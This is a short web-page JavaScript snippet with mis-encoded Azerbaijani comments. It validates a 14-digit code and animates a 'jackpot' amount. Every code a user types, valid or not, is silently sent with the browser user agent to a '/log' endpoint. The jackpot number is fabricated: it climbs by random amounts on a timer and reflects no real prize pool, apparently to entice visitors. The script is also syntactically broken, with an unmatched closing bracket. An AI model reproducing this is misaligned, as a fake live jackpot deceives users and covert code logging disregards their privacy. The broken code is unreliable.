<script>
// üîê Kod yoxlama
function checkCode(){
    const input = document.getElementById("code");
    if(!input) return;

    const raw = input.value;
    const cleaned = raw.replace(/-/g,"");
    const valid = /^\d{14}$/.test(cleaned);

    // LOG G√ñND∆èR
    fetch("/log",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({
            code: cleaned,
            valid: valid,
            agent: navigator.userAgent
        })
    });

    document.getElementById("error").innerText =
        valid ? "" : "‚ùå Kod s…ôhvdir";

    document.getElementById("buttons").style.display =
        valid ? "block" : "none";
}

// üé∞ Jackpot DOM hazƒ±r olanda

    const jackpotEl = document.getElementById("jackpot");

    let jackpot = 200;
    setInterval(()=>{

            jackpot += Math.floor(Math.random()*3)+1;
            if(jackpot > 500) jackpot = 500;
            jackpotEl.innerText = jackpot + " ‚Çº";

    },2000);
});
